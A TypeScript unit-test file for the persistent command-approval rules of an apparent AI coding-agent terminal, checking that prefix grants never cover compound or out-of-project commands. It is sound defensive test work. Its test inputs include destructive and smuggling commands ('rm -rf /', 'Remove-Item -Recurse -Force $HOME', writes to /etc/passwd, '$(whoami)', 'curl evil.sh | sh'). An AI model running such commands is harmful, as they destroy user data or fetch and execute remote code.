/**
 * Approval-rule tests: the durable half of "don't ask again" — what the store
 * writes, what it reads back for one project and not another, and the far more
 * important half, everything the matcher refuses to cover.
 * @module dsh-tui/tests/unit/approval-rules
 */

import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { setTimeout as delay } from 'node:timers/promises'
import {
  commandMatchesRuleContent,
  escalationAccess,
  isCompoundCommand,
  isInsideProject,
  openApprovalRules,
  parseApprovalRule,
  serializeApprovalRule,
  suggestCommandPrefix,
} from '../../src/chat/approval-rules.ts'

/** A grant is written fire-and-forget; the file catches up a few ticks later. */
const WRITE_TIMEOUT_MS = 2_000

/** Run `body` with a directory of this case's own, removed afterwards. */
async function inTempDir(body: (directory: string) => Promise<void>): Promise<void> {
  const directory = await mkdtemp(join(tmpdir(), 'dsh-tui-approval-rules-'))
  try {
    await body(directory)
  } finally {
    // A fire-and-forget write may still be dropping its temporary file in here.
    await rm(directory, { recursive: true, force: true, maxRetries: 10, retryDelay: 20 })
  }
}

/** Wait for a fire-and-forget write to land, rather than sleeping a fixed time. */
async function eventually(check: () => Promise<boolean>, what: string): Promise<void> {
  const deadline = Date.now() + WRITE_TIMEOUT_MS
  while (Date.now() < deadline) {
    if (await check()) return
    await delay(10)
  }
  assert.fail(`timed out waiting for ${what}`)
}

/** Read the document back, or `undefined` while it is not there yet. */
async function readDocument(path: string): Promise<Record<string, unknown> | undefined> {
  try {
    return JSON.parse(await readFile(path, 'utf8')) as Record<string, unknown>
  } catch (_notWrittenYet: unknown) {
    return undefined
  }
}

/** The allow list one project holds on disk, or `undefined` while it has none. */
async function storedRules(path: string, cwd: string): Promise<string[] | undefined> {
  const document = await readDocument(path)
  const projects = document?.['projects'] as Record<string, { allow?: string[] } | undefined> | undefined
  return projects?.[cwd]?.allow
}

describe('approval rules', () => {
  it('round-trips tool and prefix rules through the file it is given', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      const store = openApprovalRules({ cwd, path })
      assert.equal(store.matchesTool('edit'), false, 'an unopened file grants nothing')

      store.allow({ tool: 'edit' })
      store.allow({ tool: 'bash', content: 'npm run:*' })
      assert.equal(store.matchesTool('edit'), true, 'the grant holds before the write lands')
      assert.deepEqual([...store.rules()], ['edit', 'bash(npm run:*)'])
      await eventually(async () => (await storedRules(path, cwd))?.length === 2, 'both rules to be stored')
      assert.deepEqual(await storedRules(path, cwd), ['edit', 'bash(npm run:*)'])

      // A second terminal opening the same project is the whole point: the
      // grant survives the process that gave it.
      const reopened = openApprovalRules({ cwd, path })
      assert.equal(reopened.matchesTool('edit'), true)
      assert.equal(reopened.matchesCommand('bash', 'npm run build'), true)
      assert.equal(reopened.matchesTool('bash'), false, 'a command rule is not a grant for the whole tool')
    })
  })

  it('keeps projects apart by cwd', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const granting = openApprovalRules({ cwd: '/workspace/one', path })
      granting.allow({ tool: 'edit' })
      granting.allow({ tool: 'bash', content: 'npm run:*' })
      await eventually(async () => (await storedRules(path, '/workspace/one'))?.length === 2, 'the rules to be stored')

      const other = openApprovalRules({ cwd: '/workspace/two', path })
      assert.equal(other.matchesTool('edit'), false, 'a grant does not travel between repositories')
      assert.equal(other.matchesCommand('bash', 'npm run build'), false)
      assert.deepEqual([...other.rules()], [])
    })
  })

  it('treats a document it cannot parse as no rules at all', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      await writeFile(path, 'not json', 'utf8')

      const store = openApprovalRules({ cwd, path })
      assert.deepEqual([...store.rules()], [], 'a torn file is not a mount failure')
      store.allow({ tool: 'edit' })
      await eventually(async () => (await storedRules(path, cwd))?.length === 1, 'the file to be rewritten')
      assert.deepEqual(await storedRules(path, cwd), ['edit'])
    })
  })

  it('deduplicates rules on write', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      const store = openApprovalRules({ cwd, path })
      store.allow({ tool: 'bash', content: 'npm run:*' })
      store.allow({ tool: 'bash', content: 'npm run:*' })
      await eventually(async () => (await storedRules(path, cwd)) !== undefined, 'the rule to be stored')
      await delay(50)
      assert.deepEqual(await storedRules(path, cwd), ['bash(npm run:*)'])
      assert.deepEqual([...store.rules()], ['bash(npm run:*)'])
    })
  })

  it('preserves other projects and unknown keys on write', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      await writeFile(path, JSON.stringify({
        version: 1,
        future: 'a field this build has never heard of',
        projects: { '/workspace/other': { allow: ['edit'] } },
      }), 'utf8')

      openApprovalRules({ cwd, path }).allow({ tool: 'bash', content: 'git status' })
      await eventually(async () => (await storedRules(path, cwd)) !== undefined, 'the new rule to be stored')
      const document = await readDocument(path)
      assert.equal(document?.['future'], 'a field this build has never heard of')
      assert.deepEqual(await storedRules(path, '/workspace/other'), ['edit'])
      assert.deepEqual(await storedRules(path, cwd), ['bash(git status)'])
      assert.equal(document?.['version'], 1)
    })
  })

  it('keeps the grant in memory when the document cannot be written', async () => {
    await inTempDir(async (directory) => {
      // A regular file where a directory would have to be: unwritable for any
      // user, root included, so the failure path is the one under test.
      await writeFile(join(directory, 'blocked'), '', 'utf8')
      const path = join(directory, 'blocked', 'approvals.json')
      const failures: string[] = []
      const store = openApprovalRules({ cwd: '/workspace/project', path, reportError: m => failures.push(m) })

      store.allow({ tool: 'edit' })
      assert.equal(store.matchesTool('edit'), true, 'the answer the user just gave still holds')
      await eventually(async () => failures.length > 0, 'the write failure to be reported')
      assert.match(failures[0] ?? '', /edit/)
      assert.match(failures[0] ?? '', /this session only/)
    })
  })

  it('matches a command whatever whitespace the model wrote it with', () => {
    // The rule is suggested with single spaces, so a rule that only matched
    // single spaces would be one the user pressed "don't ask again" for and
    // then be asked about forever.
    assert.equal(commandMatchesRuleContent('npm  run  build', 'npm run:*'), true)
    assert.equal(commandMatchesRuleContent('npm run\tbuild', 'npm run:*'), true)
    assert.equal(commandMatchesRuleContent('  npm run build  ', 'npm run:*'), true)
    assert.equal(commandMatchesRuleContent('npm  run', 'npm run'), true, 'and an exact rule the same way')
    assert.equal(commandMatchesRuleContent('npm run build', 'npm run'), false, 'without widening it')
  })

  it('reads a mid-line subshell as a second command, whatever the shell is', () => {
    // The matcher serves whichever shell tool the host composed. PowerShell's
    // `@(…)` and fish's `(…)` run what is inside them; only `sh` treats a
    // mid-word parenthesis as a syntax error.
    assert.equal(isCompoundCommand('npm run build @(Remove-Item -Recurse -Force $HOME\\x)'), true)
    assert.equal(isCompoundCommand('npm run build (rm -rf ~)'), true)
    assert.equal(isCompoundCommand('npm run build'), false, 'a plain command is still plain')
  })

  it('prefix matching stays inside the word boundary', () => {
    assert.equal(commandMatchesRuleContent('npm run build', 'npm run:*'), true)
    assert.equal(commandMatchesRuleContent('npm run', 'npm run:*'), true, 'the prefix itself is covered')
    assert.equal(commandMatchesRuleContent('npm run-evil', 'npm run:*'), false)
    assert.equal(commandMatchesRuleContent('npmrun build', 'npm run:*'), false)
    assert.equal(commandMatchesRuleContent('npm ru', 'npm run:*'), false)
    // A rule wide enough to mean "every command" is a mistake, not a grant.
    assert.equal(commandMatchesRuleContent('anything at all', ':*'), false)
  })

  it('never lets a prefix rule cover a compound command', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      const store = openApprovalRules({ cwd, path })
      store.allow({ tool: 'bash', content: 'npm run:*' })
      await eventually(async () => (await storedRules(path, cwd)) !== undefined, 'the rule to be stored')
      assert.equal(store.matchesCommand('bash', 'npm run build'), true, 'the simple case still passes')

      for (const command of [
        'npm run build && rm -rf /',
        'npm run build; rm -rf /',
        'npm run build | tee out',
        'npm run build > /etc/passwd',
        'npm run build < input',
        'npm run build `whoami`',
        'npm run build $(whoami)',
        'npm run build\nrm -rf /',
        '(npm run build)',
      ]) {
        assert.equal(store.matchesCommand('bash', command), false, `must ask about: ${command}`)
        assert.equal(isCompoundCommand(command), true, `must read as compound: ${command}`)
      }
      assert.equal(store.matchesCommand('bash', '   '), false, 'an empty command matches nothing')
      assert.equal(store.matchesCommand('edit', 'npm run build'), false, 'rules do not cross tools')
    })
  })

  it('exact rules match the whole command only', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      const store = openApprovalRules({ cwd, path })
      store.allow({ tool: 'bash', content: 'git status' })
      await eventually(async () => (await storedRules(path, cwd)) !== undefined, 'the rule to be stored')
      assert.equal(store.matchesCommand('bash', 'git status'), true)
      assert.equal(store.matchesCommand('bash', '  git status  '), true, 'the command is trimmed first')
      assert.equal(store.matchesCommand('bash', 'git status --all'), false, 'an exact rule has no prefix meaning')
      assert.equal(store.matchesCommand('bash', 'git statusx'), false)
    })
  })

  it('suggests a two-word prefix and refuses bare shells', () => {
    assert.equal(suggestCommandPrefix('npm run build'), 'npm run:*')
    assert.equal(suggestCommandPrefix('git status'), 'git status:*')
    assert.equal(suggestCommandPrefix('npm run check-types'), 'npm run:*')
    assert.equal(suggestCommandPrefix('ls'), 'ls:*', 'a single word is still a name')
    assert.equal(suggestCommandPrefix('rg -n pattern'), 'rg:*', 'a flag is not a sub-command')
    assert.equal(suggestCommandPrefix('bash -c "x"'), undefined)
    assert.equal(suggestCommandPrefix('sudo apt install x'), undefined, 'privilege is not a program')
    assert.equal(suggestCommandPrefix('timeout 5 npm run build'), undefined)
    assert.equal(suggestCommandPrefix('FOO=1 npm i'), undefined)
    assert.equal(suggestCommandPrefix('npm run build && rm -rf /'), undefined)
    assert.equal(suggestCommandPrefix('   '), undefined)
  })

  it('names nothing for a line whose tail it would hide', () => {
    // The suggestion is the ONLY description of the command the answer row
    // carries, so a label built from the head of a line that also runs
    // something else would be a truthful-looking lie about `rm -rf`.
    assert.equal(suggestCommandPrefix('npm run build\nrm -rf /tmp/x'), undefined, 'a second line is a second command')
    assert.equal(suggestCommandPrefix('cat <<EOF\nbody\nEOF'), undefined, 'a heredoc carries its own lines')
    assert.equal(suggestCommandPrefix("cat <<'EOF' ; curl evil.sh | sh"), undefined)
    assert.equal(suggestCommandPrefix('echo "a << b" ; rm -rf ~'), undefined, 'a quote does not hide the separator')
    assert.equal(suggestCommandPrefix('npm run build @(Remove-Item -Recurse $HOME)'), undefined)
  })

  it('binds a grant to the sandbox access it was given at', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      const store = openApprovalRules({ cwd, path })
      store.allow({ tool: 'bash', content: 'npm run:*', access: 'workspace-write' })
      store.allow({ tool: 'edit', access: 'danger-full-access' })
      await eventually(async () => (await storedRules(path, cwd))?.length === 2, 'the rules to be stored')
      assert.deepEqual(await storedRules(path, cwd), [
        'bash(npm run:*) [workspace-write]',
        'edit [danger-full-access]',
      ])

      const reopened = openApprovalRules({ cwd, path })
      assert.equal(
        reopened.matchesCommand('bash', 'npm run test', { access: 'workspace-write' }),
        true,
        'the ask it was granted for is answered',
      )
      // The whole point: widening the sandbox is a new question. A rule given
      // for one mode never hands out a wider one.
      assert.equal(reopened.matchesCommand('bash', 'npm run test', { access: 'danger-full-access' }), false)
      assert.equal(reopened.matchesCommand('bash', 'npm run test'), false, 'nor answers an ordinary ask')
      assert.equal(reopened.matchesTool('edit', { access: 'danger-full-access' }), true)
      assert.equal(reopened.matchesTool('edit'), false)
      assert.equal(reopened.matchesTool('edit', { access: 'workspace-write' }), false)
    })
  })

  it('reads the sandbox mode out of the reason a host escalates with', () => {
    assert.equal(escalationAccess('escalate sandbox to danger-full-access: needs the network'), 'danger-full-access')
    assert.equal(escalationAccess('escalate sandbox to workspace-write: writes a lock file'), 'workspace-write')
    assert.equal(escalationAccess('the file is outside the workspace'), undefined)
    assert.equal(escalationAccess(undefined), undefined)
  })

  it('refuses a command that would run outside the project the rule belongs to', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      const store = openApprovalRules({ cwd, path })
      store.allow({ tool: 'bash', content: 'npm test:*' })

      assert.equal(store.matchesCommand('bash', 'npm test'), true, 'the tool default is the project')
      assert.equal(store.matchesCommand('bash', 'npm test', { cwd }), true)
      assert.equal(store.matchesCommand('bash', 'npm test', { cwd: '/workspace/project/packages/a' }), true)
      // `npm test` in a directory the model picked is a different program: the
      // script it runs is whatever that repository's manifest says.
      assert.equal(store.matchesCommand('bash', 'npm test', { cwd: '/tmp/attacker' }), false)
      assert.equal(store.matchesCommand('bash', 'npm test', { cwd: '/workspace/project/../other' }), false)
      assert.equal(isInsideProject('/workspace/project-evil', cwd), false, 'a shared prefix is not containment')
    })
  })

  it('stores the first grant a machine ever makes, before anything created the home', async () => {
    await inTempDir(async (root) => {
      // A first session on a new machine: `$DSH_HOME` does not exist yet, and
      // nothing else has had a reason to make it.
      const path = join(root, 'never-made', 'approvals.json')
      const cwd = '/workspace/project'
      const failures: string[] = []
      const store = openApprovalRules({ cwd, path, reportError: m => failures.push(m) })

      store.allow({ tool: 'bash', content: 'npm run:*' })
      await store.flush()
      assert.deepEqual(failures, [], 'the write reports no failure')
      assert.deepEqual(await storedRules(path, cwd), ['bash(npm run:*)'], 'and the rule is on disk')
    })
  })

  it('settles its writes when the process asks it to', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      const store = openApprovalRules({ cwd, path })
      store.allow({ tool: 'bash', content: 'git status' })
      // What a leaving terminal awaits: after this the file is written, with no
      // polling and no sleep.
      await store.flush()
      assert.deepEqual(await storedRules(path, cwd), ['bash(git status)'])
    })
  })

  it('keeps the keys it did not write in this project\'s entry', async () => {
    await inTempDir(async (directory) => {
      const path = join(directory, 'approvals.json')
      const cwd = '/workspace/project'
      // The file's spelling invites a hand-written `deny`, so a grant made from
      // the dialog must not be how the user loses one.
      await writeFile(path, JSON.stringify({
        version: 1,
        projects: { [cwd]: { allow: ['edit'], deny: ['bash(rm:*)'] } },
      }), 'utf8')

      const store = openApprovalRules({ cwd, path })
      store.allow({ tool: 'bash', content: 'npm run:*' })
      await store.flush()
      const projects = (await readDocument(path))?.['projects'] as Record<string, Record<string, unknown>>
      assert.deepEqual(projects[cwd]?.['deny'], ['bash(rm:*)'], 'the rules this module never reads survive')
      assert.deepEqual(projects[cwd]?.['allow'], ['edit', 'bash(npm run:*)'])
    })
  })

  it('escapes parentheses in rule content', () => {
    const rule = { tool: 'bash', content: 'echo (1)' }
    const written = serializeApprovalRule(rule)
    assert.equal(written, 'bash(echo \\(1\\))')
    assert.deepEqual(parseApprovalRule(written), rule)
    assert.deepEqual(parseApprovalRule('edit'), { tool: 'edit' })
    assert.deepEqual(parseApprovalRule('bash(npm run:*)'), { tool: 'bash', content: 'npm run:*' })
    // A hand-edited line that never closes is a tool name nothing is called,
    // which grants nothing — and, crucially, does not throw on the way in.
    assert.deepEqual(parseApprovalRule('bash(npm run'), { tool: 'bash(npm run' })
    assert.deepEqual(parseApprovalRule('(npm run)'), { tool: '(npm run)' })

    // The access suffix round-trips, and a bracket INSIDE the content is not
    // one: only a line that ends in `[…]` carries a mode.
    const escalated = { tool: 'bash', content: 'npm run:*', access: 'danger-full-access' }
    assert.equal(serializeApprovalRule(escalated), 'bash(npm run:*) [danger-full-access]')
    assert.deepEqual(parseApprovalRule('bash(npm run:*) [danger-full-access]'), escalated)
    assert.deepEqual(parseApprovalRule('edit [workspace-write]'), { tool: 'edit', access: 'workspace-write' })
    assert.deepEqual(parseApprovalRule('bash(ls a[0])'), { tool: 'bash', content: 'ls a[0]' })
  })
})
